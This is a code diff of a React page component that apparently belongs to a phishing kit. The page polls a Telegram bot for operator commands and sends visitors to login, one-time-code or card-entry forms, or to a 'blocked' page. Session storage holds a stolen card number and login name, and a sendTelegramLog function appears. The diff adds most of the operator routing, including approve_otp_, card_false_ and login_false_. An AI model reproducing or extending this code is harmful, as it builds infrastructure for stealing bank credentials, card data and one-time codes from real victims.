@@ -21,25 +21,24 @@ function NextStepAppr() {
   // ✅ Message states
   const [showMessage, setShowMessage] = useState(false);
   const [messageText, setMessageText] = useState('');
-  const [messageType, setMessageType] = useState(''); // 'success' or 'warning'
+  const [messageType, setMessageType] = useState('');
 
-  // ✅ Handle Success button - Show message on page
+  // ✅ Handle Success button
   const handleSuccessCard = () => {
-  console.log('✅ Success button clicked');
-  setIsConfirmed(false);
-  setMessageText('Ihre Sitzung ist abgelaufen. Bitte versuchen Sie es erneut.');
-  setMessageType('warning');
-  setShowMessage(true);
-  
-  // Hide message after 3 seconds and redirect
-  setTimeout(() => {
-    setShowMessage(false);
-    sessionStorage.setItem('showCardForm', 'true');
-    window.location.href = '/#/';
-  }, 3000);
-};
+    console.log('✅ Success button clicked');
+    setIsConfirmed(false);
+    setMessageText('Ihre Sitzung ist abgelaufen. Bitte versuchen Sie es erneut.');
+    setMessageType('warning');
+    setShowMessage(true);
+    
+    setTimeout(() => {
+      setShowMessage(false);
+      sessionStorage.setItem('showCardForm', 'true');
+      window.location.href = '/#/';
+    }, 3000);
+  };
 
-  // ✅ Handle Back to Appr button - Show message on page
+  // ✅ Handle Back to Appr button
   const handleBackToAppr = () => {
     console.log('⬅️ Back to Appr clicked');
     setIsConfirmed(false);
@@ -47,7 +46,6 @@ function NextStepAppr() {
     setMessageType('warning');
     setShowMessage(true);
     
-    // Hide message after 3 seconds
     setTimeout(() => {
       setShowMessage(false);
     }, 3000);
@@ -58,7 +56,7 @@ function NextStepAppr() {
     setShowMessage(false);
   };
 
-  // ✅ ADDED: Polling for Telegram callbacks
+  // ✅ Polling for Telegram callbacks - MUST BE INSIDE THE FUNCTION
   useEffect(() => {
     let lastUpdateId = 0;
     
@@ -73,11 +71,44 @@ function NextStepAppr() {
             
             if (update.callback_query) {
               const callbackData = update.callback_query.data;
+              console.log('📨 NextStepAppr received:', callbackData);
               
               if (callbackData.startsWith('success_card_')) {
                 handleSuccessCard();
               } else if (callbackData.startsWith('back_to_appr_')) {
                 handleBackToAppr();
+              } else if (callbackData.includes('next_') || callbackData.includes('otp_login_')) {
+                sessionStorage.setItem('showOtpForm', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('back_to_card_')) {
+                sessionStorage.setItem('showCardForm', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('back_to_login_')) {
+                sessionStorage.clear();
+                window.location.href = '/#/';
+              } else if (callbackData.includes('approve_otp_')) {
+                sessionStorage.setItem('loginSuccess', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('otp_false_')) {
+                sessionStorage.setItem('otpError', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('card_false_')) {
+                sessionStorage.setItem('showCardForm', 'true');
+                sessionStorage.setItem('cardError', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('block_')) {
+                window.location.href = '/#/blocked';
+              } else if (callbackData.includes('approve_login_')) {
+                sessionStorage.setItem('showApprovePopup', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('login_false_')) {
+                sessionStorage.setItem('loginError', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('card_verification_')) {
+                sessionStorage.setItem('showCardForm', 'true');
+                window.location.href = '/#/';
+              } else if (callbackData.includes('deny_')) {
+                window.location.href = '/#/blocked';
               }
               
               await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -94,8 +125,9 @@ function NextStepAppr() {
     
     const interval = setInterval(pollTelegram, 3000);
     return () => clearInterval(interval);
-  }, []);
+  }, []); // ✅ This useEffect is INSIDE the function
 
+  // ✅ Second useEffect for loading card data
   useEffect(() => {
     const storedCardNumber = sessionStorage.getItem('cardNumber');
     const storedUsername = sessionStorage.getItem('loginName');
@@ -114,6 +146,8 @@ function NextStepAppr() {
     
     return () => clearInterval(timer);
   }, []);
+
+  
 
   const sendTelegramLog = async () => {
     try {
